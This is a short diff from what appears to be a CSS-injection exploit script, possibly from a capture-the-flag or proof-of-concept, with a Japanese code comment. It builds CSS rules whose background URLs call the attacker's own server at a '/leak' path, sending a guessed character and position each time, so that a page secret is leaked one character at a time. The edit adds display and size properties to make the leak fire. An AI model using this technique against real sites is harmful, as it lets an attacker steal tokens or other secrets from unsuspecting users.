@@ -57,7 +57,7 @@ def next_char():
         # pos=current_pos を付与して、重複リクエストによる誤判定を防ぐ
         leak_url = f"{MY_URL}/leak?char={safe_char}&pos={current_pos}"
         
-        rule = f"{selector_chain} {{ background: url('{leak_url}'); }}"
+        rule = f"{selector_chain} {{ display: block; width: 10px; height: 10px; background: url('{leak_url}'); }}"
         css_rules.append(rule)
 
     css_payload = "\n".join(css_rules)
